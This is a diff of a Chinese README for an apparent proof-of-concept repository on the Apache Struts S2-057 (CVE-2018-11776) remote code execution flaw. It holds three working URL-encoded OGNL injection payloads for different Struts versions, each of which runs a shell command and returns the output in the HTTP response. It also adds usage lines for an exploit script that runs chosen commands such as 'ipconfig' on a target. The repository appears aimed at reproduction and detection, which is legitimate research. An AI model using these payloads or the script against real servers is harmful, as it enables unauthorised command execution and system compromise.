@@ -11,7 +11,7 @@ FN@悬镜安全实验室
 第一次poc请求会500，然后再次请求命令执行成功，原因未知，猜测是setExcluded*的问题
 
 ```
-$%7B(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.setExcludedClasses('java.lang.Shutdown')).(%23ou.setExcludedPackageNames('sun.reflect.')).(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
+%24%7B%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.setExcludedClasses%28%27java.lang.Shutdown%27%29%29.%28%23ou.setExcludedPackageNames%28%27sun.reflect.%27%29%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%22whoami%22%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D
 ```
 
 - struts 2.3.34：
@@ -19,13 +19,13 @@ $%7B(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.
 本地测试发现下面poc中的(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear())去掉也能执行成功
 
 ```
-$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
+%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%22whoami%22%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D
 ```
 
 - struts 2.3.20、struts 2.2.3.1等：
 
 ```
-$%7B(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
+%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23cmd%3D%22whoami%22%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D
 ```
 
 注意：/不能编码为%2f，这个坑了好久，tomcat的原因
@@ -181,6 +181,28 @@ http://HOST/S2-057-2-3-34/POC/actionChain3.action
 
 ![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Postback-echo.jpg)
 
+## 检测脚本
+
+写的不是很好，将就用吧，有bug自行修改，参考了https://github.com/mazen160/struts-pwn_CVE-2018-11776
+
+建议检测的话两种方式都检测
+
+1.表达式检测
+
+python S2-057-exp.py -u http://localhost:8080/S2-057-2-3-34/actionChain1.action
+
+2.命令执行检测
+
+python S2-057-exp.py -u http://localhost:8080/S2-057-2-3-34/actionChain1.action --exp
+
+确定了注入点和POC的话可以使用下面的参数配合使用（源码只检测了最后一个注入点，见源码注释）
+
+python S2-057-exp.py -i http://localhost:8080/S2-057-2-3-34/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c ipconfig --exp
+
+更多帮助参考python S2-057-exp.py -h
+
+实际测试检测了差不多100个URL，没一个存在的，估计利用条件是真的难，不想再研究了
+
 ## 参考
 
 [S2-057 远程命令执行漏洞复现](https://mp.weixin.qq.com/s/H6bLuXS8qCVRh1mSgAkdXQ)
@@ -196,8 +218,3 @@ http://HOST/S2-057-2-3-34/POC/actionChain3.action
 https://github.com/jas502n/St2-057
 
 https://lgtm.com/blog/apache_struts_CVE-2018-11776
-
-## TODO
-
-1. 通用检测脚本，发现有的脚本只检测了Redirect action的情况
-2. 实际测试
